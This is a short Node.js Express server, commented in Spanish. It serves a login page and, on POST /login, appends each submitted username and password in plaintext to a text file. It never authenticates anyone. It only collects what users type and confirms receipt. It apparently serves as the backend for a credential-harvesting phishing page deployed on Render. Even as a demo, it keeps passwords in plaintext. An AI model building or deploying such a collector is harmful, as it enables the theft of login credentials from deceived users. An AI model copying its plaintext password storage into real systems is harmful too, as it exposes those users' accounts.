const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');
const path = require('path'); // <-- necesario para enviar archivos

const app = express();
const PORT = process.env.PORT || 3000; // usar variable de entorno para Render

app.use(cors());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Ruta para servir index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Ruta POST /login
app.post('/login', (req, res) => {
  const { usuario, password } = req.body;
  const log = `Usuario: ${usuario}, Contraseña: ${password}\n`;

  fs.appendFile('datos_login.txt', log, (err) => {
    if (err) {
      console.error('Error al guardar datos:', err);
      return res.status(500).send('Error del servidor');
    }
    console.log('Datos guardados');
    res.send('Datos recibidos');
  });
});

// Iniciar servidor
app.listen(PORT, () => {
  console.log(`Servidor corriendo en http://localhost:${PORT}`);
});
